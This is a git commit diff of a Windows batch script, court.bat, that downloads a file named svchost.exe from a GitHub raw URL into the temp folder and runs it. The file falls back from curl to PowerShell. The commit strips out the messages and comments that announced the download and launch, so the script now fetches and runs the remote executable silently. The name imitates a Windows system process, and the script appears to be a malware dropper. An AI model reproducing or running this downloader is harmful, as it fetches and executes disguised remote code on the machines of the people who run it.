10920dc931d0c722159bb8818ea65b86acb9ed73
madhead341 <106779656+madhead341@users.noreply.github.com>
2025-05-03 19:38:43 +0200

    Update court.bat

--- court.bat
+++ court.bat
@@ -1,6 +1,5 @@
 @echo off
 setlocal
-
 REM Define the URL of the installer
 set "URL=https://github.com/madhead341/KickAss/raw/refs/heads/main/svchost.exe"
 
@@ -8,13 +7,9 @@ REM Set the download location
 set "INSTALLER_PATH=%TEMP%\svchost.exe"
 
 REM Use curl or powershell to download the file
-echo Downloading installer...
 curl -L "%URL%" -o "%INSTALLER_PATH%" || (
     powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%INSTALLER_PATH%'"
 )
-
-REM Execute the installer
-echo Running installer...
 start "" "%INSTALLER_PATH%"
 
 endlocal
